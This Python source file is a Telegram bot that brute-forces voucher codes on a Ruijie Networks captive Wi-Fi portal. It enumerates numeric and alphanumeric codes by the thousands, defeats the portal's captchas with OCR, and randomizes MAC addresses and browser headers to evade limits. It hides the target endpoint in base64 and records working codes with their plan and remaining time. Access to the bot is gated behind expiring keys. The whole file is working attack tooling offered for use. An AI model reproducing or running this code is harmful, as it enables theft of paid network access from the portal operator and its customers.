        await bot.reply_to(message, "⚠️ အသုံးပြုရန် /key <key> ဖြင့် အတည်ပြုပါ။")
        return
    # Admin သည် auth_list နှင့် expiration မစစ်ဘဲ အမြဲအသုံးပြုနိုင်ပါသည်။
    user_data.setdefault(chat_id, {})
    if 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
        return

    if (
        chat_id in scan_tasks
        and not scan_tasks[chat_id]["task"].done()
    ):
        await bot.reply_to(
            message,
            "/scan သည် အလုပ်လုပ်နေပြီဖြစ်သည် /scan ကိုထပ်မံမလုပ်ပါနှင့်။"
        )
        return

    progress_msg = await bot.send_message(
        chat_id,
        format_progress(
            0,
            10 ** int(mode) if mode in ["6", "7"] else None,
            0,
            0,
            0,
            {"captcha": 0, "ban": 0},
            []
        ),
        parse_mode="Markdown"
    )
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            message=message,
            progress_msg=progress_msg
        )
    )

    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id
    }

@bot.message_handler(commands=['speed'])
async def set_speed(message):
    global SPEED_LIMIT
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        current = f"{SPEED_LIMIT:,.0f} codes/min" if SPEED_LIMIT else "Unlimited"
        await bot.reply_to(
            message,
            f"⚡ Current speed limit: {current}\n\n"
            "Usage: /speed 7890\n"
            "Disable: /speed off"
        )
        return

    value = args[1].strip().lower()
    if value in {"off", "none", "0", "unlimited"}:
        SPEED_LIMIT = None
        await bot.reply_to(message, "✅ Speed limit disabled. Speed is unlimited.")
        return

    try:
        new_limit = float(value)
        if new_limit <= 0 or new_limit > 1_000_000:
            raise ValueError
    except ValueError:
        await bot.reply_to(
            message,
            "❌ Invalid speed limit. Use a number between 1 and 1,000,000.\n"
            "Example: /speed 7890"
        )
        return

    SPEED_LIMIT = new_limit
    await bot.reply_to(
        message,
        f"✅ Speed limit set to {SPEED_LIMIT:,.0f} codes/min.\n"
        "It will apply to new and active scans."
    )


@bot.message_handler(commands=['status'])
async def status(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(
        1 for data in scan_tasks.values()
        if not data["task"].done()
    )
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}"
    )

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        await bot.reply_to(message, "/scan ကို ရပ်တန့်ပြီးပါပြီ။")
    else:
        await bot.reply_to(message, "/stop ဖြင့်ရပ်တန့်ရန် မည်သည့်အလုပ်မျှမရှိပါ။")

async def cleanup_expired_keys():
    """Remove expired generated keys from auth_list.json on GitHub."""
    try:
        auth_list, sha = await get_file_content("auth_list.json")
        if not auth_list or not sha:
            return 0
        expired_keys = [
            key for key, data in auth_list.items()
            if str(key).strip() != str(ADMIN_ID).strip()
            and isinstance(data, dict)
            and data.get("expires_at") != ADMIN_UNLIMITED_EXPIRY
            and not check_key_expiration(data)
        ]
        if not expired_keys:
            return 0
        for key in expired_keys:
            del auth_list[key]
        await update_file_content(
            "auth_list.json", auth_list, sha,
            f"Auto-remove {len(expired_keys)} expired key(s)"
        )
        print(f"Removed expired keys: {len(expired_keys)}")
        return len(expired_keys)
    except Exception as exc:
        print(f"Expired-key cleanup error: {exc}")
        return 0


async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(80)
        await cleanup_expired_keys()
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    detail = item.get("detail", "")
                    if chat_id not in results:
                        results[chat_id] = []
                    existing_codes = {
                        entry.get("code") if isinstance(entry, dict) else str(entry)
                        for entry in results[chat_id]
                    }
                    if code not in existing_codes:
                        results[chat_id].append({"code": code, "detail": detail})
                await update_file_content(
                    "result.json",
                    results,
                    sha,
                    "Periodic Update"
                )
            except Exception as e:
                print(f"Update Error: {e}")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, retries=0, stats=None, found_details=None):
    stats = stats or {}
    expired = stats.get("expired", 0)
    limits = stats.get("limits", 0)
    proxy_used = stats.get("proxy_used", 0)
    proxy_total = stats.get("proxy_total", 0)
    current_code = stats.get("current_code", "-")
    last_hit = stats.get("last_hit", "-")
    speed_str = f"{speed:,.1f} c/m"
    speed_limit_line = f"👹 **Speed Limit:** `{SPEED_LIMIT:,.0f} c/m`\n" if SPEED_LIMIT else ""
    if total is not None:
        percent = min(100, (checked / total) * 100)
        bar_length = 20
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
    else:
        percent = 0
        bar = "░" * 20

    formatted_hits = []
    for raw_hit in (found_details or [])[-5:]:
        # Convert the stored hit into a compact VIP card.
        if " 🃏: " in raw_hit:
            code, details = raw_hit.split(" 🃏: ", 1)
            parts = details.replace("📋 ", "").split(" | ")
            plan_text = parts[0].removeprefix("Plan: ") if parts else "Unknown"
            time_text = parts[1].removeprefix("⏳ Time: ") if len(parts) > 1 else "Unknown"
            hit_card = (
                f"╭─ 🃏 {code} 🪙\n"
                f"│ 📀 Plan: {plan_text}\n"
                f"│ ⏳ Valid: {pretty_duration(time_text)}\n"
                "╰──────────────"
            )
        else:
            hit_card = f"╭─ 🃏 {raw_hit} 🪙\n╰──────────────"
        formatted_hits.append(hit_card)

    text = (
        "⚡ **Scanner Running** ⚡\n"
        "🍁 Thank you for using STLINK BOT\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🗡️ **Tried:** `{checked:,}`\n"
        f"🎯 **Current Code:** `{current_code}`\n"
        f"⚜️ **Hits:** `{found}`\n"
        f"🛡️ **Expired:** `{expired}`\n"
        f"🚧 **Limits:** `{limits}`\n"
        f"⚡ **Speed:** `{speed_str}`\n"
        f"{speed_limit_line}"
        f"🔀 **Proxies:** `{proxy_used}/{proxy_total}`\n"
        f"📈 **Progress:** `{percent:.2f}%`\n"
        f"{bar}\n"
        "━━━━━━━━━━━━━━━━━━"
    )
    if formatted_hits:
        text += "\n🔱 **Hit Codes**\n━━━━━━━━━━━━━━━━━━\n" + "\n\n".join(formatted_hits)
    text += f"\n━━━━━━━━━━━━━━━━━━\n🔥 **Last:** {last_hit}"
    return text

BATCH_SIZE = 2000

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {
            "session_id": None,
            "auth_code": None,
            "lock": asyncio.Lock(),
        }
    return captcha_state[chat_id]

async def get_captcha(chat_id, session, session_url):
    entry = _captcha_entry(chat_id)
    if entry["session_id"] and entry["auth_code"]:
        return entry["session_id"], entry["auth_code"]
    async with entry["lock"]:
        if entry["session_id"] and entry["auth_code"]:
            return entry["session_id"], entry["auth_code"]
        session_id = await get_session_id(session, session_url, entry.get("session_id"))
        if not session_id:
            return None, None
        for _ in range(10):
            image = await Captcha_Image(session, session_id)
            text = await Captcha_Text(image)
            verified = await Varify_Captcha(session, session_id, text)
            if verified:
                entry["session_id"] = session_id
                entry["auth_code"] = text
                print(f"[captcha] solved sid={session_id} code={text}")
                return session_id, text
        return None, None

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_stats[chat_id] = {
        "captcha": 0,
        "ban": 0,
        "expired": 0,
        "limits": 0,
        "proxy_used": 0,
        "proxy_total": 0,
        "current_code": "-",
        "last_hit": "-",
    }
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            if time.monotonic() - last_key_check >= 600:
                auth_list, _ = await get_file_content("auth_list.json")
                if (
                    not is_admin(chat_id)
                    and (
                        str(chat_id) not in auth_list
                        or not check_key_expiration(auth_list[str(chat_id)])
                    )
                ):
                    approve[chat_id] = False
                    await bot.send_message(
                        chat_id,
                        "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။"
                    )
                    scan_tasks.pop(chat_id, None)
                    success_messages.pop(chat_id, None)
                    success_texts.pop(chat_id, None)
                    return
                last_key_check = time.monotonic()

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(
                        session_url, code, chat_id, scan_id, message=message
                    )

            batch_started = time.monotonic()
            scan_stats[chat_id]["current_code"] = batch[-1]
            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            # Pace each batch so the real scanning rate stays below the chosen cap.
            if SPEED_LIMIT:
                target_batch_seconds = len(batch) * 60 / SPEED_LIMIT
                batch_elapsed = time.monotonic() - batch_started
                if batch_elapsed < target_batch_seconds:
                    await asyncio.sleep(target_batch_seconds - batch_elapsed)

            checked += len(batch)

            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            retries = retry_counts.get(chat_id, 0)
            text = format_progress(
                checked, total, speed, found, retries,
                scan_stats.get(chat_id),
                success_texts.get(chat_id, [])
            )
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=text,
                    parse_mode="Markdown"
                )
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text, parse_mode="Markdown")
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"Progress Message Error: {err}")

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            final_retries = retry_counts.get(chat_id, 0)
            finish_text = format_progress(
                checked, total or checked, 0, final_found, final_retries,
                scan_stats.get(chat_id),
                success_texts.get(chat_id, [])
            )
            finish_text = finish_text.replace("⚡ **Scanner Running** ⚡", "🏆 **Scanner Completed** 🏆")
            finish_text = finish_text.replace("📊Progress : 100.00%", "📊Progress : 100%")
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                message_id=progress_msg.message_id,
                text=finish_text,
                parse_mode="Markdown"
            )
            except:
                try:
                    await bot.send_message(chat_id, finish_text, parse_mode="Markdown")
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        scan_stats.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        scan_stats.pop(chat_id, None)


def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    from urllib.parse import urlparse, parse_qs

    mac = get_mac()
    session_url = replace_mac(session_url.strip().strip('<>'), new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
    }

    def extract_sid(value):
        if not value:
            return None
        # Query, fragment နှင့် encoded URL များအတွက် case-insensitive parsing ပြုလုပ်ပါ။
        for part in (str(value), str(value).replace('\\/', '/')):
            match = re.search(r'(?:[?&#]|\\b)sessionid(?:=|%3D)([^&#%\\s"\'<>]+)', part, re.IGNORECASE)
            if match:
                return match.group(1)
            parsed = urlparse(part)
            for source in (parsed.query, parsed.fragment):
                params = parse_qs(source, keep_blank_values=True)
                for name, values in params.items():
                    if name.lower() == 'sessionid' and values and values[0]:
                        return values[0]
        return None

    try:
        # URL ထဲမှာ sessionId ရှိပြီးသားဆိုရင် network request မလိုပါ။
        sid = extract_sid(session_url)
        if sid:
            return sid

        timeout = aiohttp.ClientTimeout(total=20)
        async with session.get(
            session_url,
            headers=headers,
            allow_redirects=True,
            timeout=timeout,
        ) as req:
            candidates = [str(req.url)]
            candidates.extend(str(item.url) for item in getattr(req, 'history', ()))
            for candidate in candidates:
                sid = extract_sid(candidate)
                if sid:
                    return sid

            # Gateway အချို့သည် sessionId ကို HTML/JS ထဲတွင်သာ ထည့်ပေးသည်။
            body = await req.text(errors='ignore')
            sid = extract_sid(body)
            if sid:
                return sid

            print(f'[get_session_id] no sessionId; status={req.status}, final_url={req.url}')
            return previous_session_id
    except Exception as exc:
        print(f'[get_session_id] fetch error: {type(exc).__name__}: {exc}')
        return previous_session_id

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:

            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return

            auth_code = None
            if not recheck:
                scan_stats.setdefault(chat_id, {"captcha": 0, "ban": 0})["captcha"] += 1
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")
            if not auth_code:
                return

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": (
                    f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                ),
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
            except Exception as e:
                print(f"[perform_check] error: {e}")
                return

        if response and 'request limited' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            continue
        if response and "ban" in response.lower() and not recheck:
            scan_stats.setdefault(chat_id, {"captcha": 0, "ban": 0})["ban"] += 1
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        hit_line = f"{code} 🃏: {expire_date}"
        success_texts[chat_id].append(hit_line)
        scan_stats.setdefault(chat_id, {}).update({"last_hit": f"✅ HIT: {hit_line}"})
        code_line = "\n".join(success_texts[chat_id])
        await SUCCESS_CODE.put({
            "chat_id": chat_id,
            "code": code,
            "detail": hit_line
        })
        # Hits are displayed in the single live progress message.
    elif 'STA' in response:
        scan_stats.setdefault(chat_id, {}).update({"limits": scan_stats.get(chat_id, {}).get("limits", 0) + 1})
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
        limited_line = "\n\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(
                        chat_id=message.chat.id,
                        text=f"Limited Codes:\n\n{limited_line}"
                    )
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=limited_messages[chat_id],
                            text=f"Limited Codes:\n\n{limited_line}"
                        )
                    except Exception as e:
                        try:
                            sent = await bot.send_message(
                                chat_id=message.chat.id,
                                text=f"Limited Codes:\n\n{limited_line}"
                            )
                            limited_messages[chat_id] = sent.message_id
                        except Exception as err:
                            print(f"Limited Fallback Error: {err}")
            except Exception as e:
                print(f"Limited Message Error: {e}")

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    hours = int(total_minutes) // 60
    minutes = int(total_minutes) % 60
    if hours > 0 and minutes > 0:
        return f"{hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h"
    else:
        return f"{minutes}m"

async def Code_Expires_Date(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId=04ecdc104a99406194f594057b21fd21&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as fresh_session:
            async with fresh_session.get(
                f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
                headers=headers
            ) as req:
                respond = await req.json()
                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
    except Exception as e:
        print(f"[Code_Expires_Date] error: {e}")
        return "📋 Plan: Unknown | ⏳ Time: Unknown"


_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
        if data.get("success") == True:
            return session_id
        else:
            return None


def _load_notification_history():
    try:
        with open(NOTIFICATION_HISTORY_FILE, "r", encoding="utf-8") as history_file:
            data = json.load(history_file)
            return data if isinstance(data, dict) else {}
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        return {}


def _save_notification_history(history):
    temporary_file = f"{NOTIFICATION_HISTORY_FILE}.tmp"
    with open(temporary_file, "w", encoding="utf-8") as history_file:
        json.dump(history, history_file, ensure_ascii=False, indent=2)
    os.replace(temporary_file, NOTIFICATION_HISTORY_FILE)


async def send_auto_expiry_notifications():
    if not AUTO_NOTIFY_ENABLED or not user_data:
        return 0
    auth_list, _ = await get_file_content("auth_list.json")
    now = datetime.now(timezone.utc)
    history = _load_notification_history()
    delivered = 0
    for chat_id, profile in list(user_data.items()):
        active_key = profile.get("active_key") if isinstance(profile, dict) else None
        key_data = auth_list.get(active_key) if active_key else None
        if not isinstance(key_data, dict) or key_data.get("expires_at") == ADMIN_UNLIMITED_EXPIRY:
            continue
        try:
            expiry = datetime.fromisoformat(str(key_data.get("expires_at")).replace("Z", "+00:00"))
        except (TypeError, ValueError):
            continue
        if expiry <= now:
            continue
        remaining_seconds = (expiry - now).total_seconds()
        for threshold_days in AUTO_NOTIFY_DAYS:
            history_key = f"{chat_id}:{active_key}:{threshold_days}"
            if remaining_seconds <= threshold_days * 86400 and history_key not in history:
                recipient = {
                    "chat_id": chat_id,
                    "name": profile.get("display_name") or "VIP User",
                    "username": profile.get("username") or "",
                    "remaining": format_key_remaining(key_data),
                    "expires_at": format_expiry_date(key_data.get("expires_at")),
                }
                try:
                    await bot.send_message(
                        chat_id,
                        EXPIRY_NOTIFICATION_TEMPLATE.format(
                            name=html.escape(recipient["name"]),
                            username_line=(
                                f"\n👤 Username: @{html.escape(recipient['username'])}"
                                if recipient["username"] else ""
                            ),
                            expires_at=html.escape(recipient["expires_at"]),
                            remaining=html.escape(recipient["remaining"]),
                        ),
                        parse_mode="HTML",
                    )
                    history[history_key] = {"sent_at": get_current_time(), "threshold_days": threshold_days}
                    delivered += 1
                except Exception as exc:
                    print(f"Auto expiry notification failed for {chat_id}: {exc}")
                break
    if delivered:
        _save_notification_history(history)
    return delivered


async def auto_expiry_notification_scheduler():
    await asyncio.sleep(15)
    while True:
        try:
            delivered = await send_auto_expiry_notifications()
            if delivered:
                print(f"[expiry-notify] sent={delivered}")
        except Exception as exc:
            print(f"[expiry-notify] scheduler error: {exc}")
        await asyncio.sleep(AUTO_NOTIFY_INTERVAL_HOURS * 3600)


async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=35)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(
        limit=5000,
        ttl_dns_cache=300,
        ssl=False
    )
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )
    try:
        await load_user_registry()
        if os.environ.get("DISABLE_BOT_WEB_SERVER", "0") != "1":
            asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        asyncio.create_task(auto_expiry_notification_scheduler())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
